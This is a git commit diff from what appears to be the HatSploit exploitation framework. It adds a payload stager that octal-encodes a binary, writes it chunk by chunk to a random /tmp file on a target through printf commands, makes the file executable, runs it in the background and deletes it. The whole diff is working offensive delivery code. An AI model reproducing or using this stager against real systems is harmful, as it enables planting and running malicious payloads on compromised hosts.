273f0da2ace3ea63992894f08e119a3d6f3da043
Ivan Nikolsky <enty8080@gmail.com>
2021-09-26 20:14:05 +0300

    Update printf.py

--- hatsploit/core/handler/stages/printf.py
+++ hatsploit/core/handler/stages/printf.py
@@ -24,5 +24,43 @@
 # SOFTWARE.
 #
 
+import os
+import binascii
+
+from hatsploit.core.cli.badges import Badges
+
 class PrintfStage:
-    pass
+    badges = Badges()
+
+    def bytes_to_octal(self, bytes_obj):
+        byte_octals = []
+        for byte in bytes_obj:
+            byte_octal = '\\' + oct(byte)[2:]
+            byte_octals.append(byte_octal)
+        return ''.join(byte_octals)
+
+    def send(self, payload, sender, args=[], payload_args="", delim=';',
+             location='/tmp', linemax=100):
+        self.badges.print_process("Sending payload stage...")
+        filename = binascii.hexlify(os.urandom(8)).decode()
+        path = location + '/' + filename
+
+        printf_stream = "printf '{}' >> {}"
+        printf_max_length = linemax
+
+        size = len(payload)
+        num_parts = int(size / printf_max_length) + 1
+
+        for i in range(0, num_parts):
+            current = i * printf_max_length
+            block = self.bytes_to_octal(payload[current:current + printf_max_length])
+            if block:
+                command = printf_stream.format(block, path)
+
+                self.badges.print_multi(f"Uploading payload... ({str(current)}/{str(size)})")
+                sender(*args, command)
+
+        self.badges.print_process("Executing payload...")
+        args = args if args is not None else ""
+
+        sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
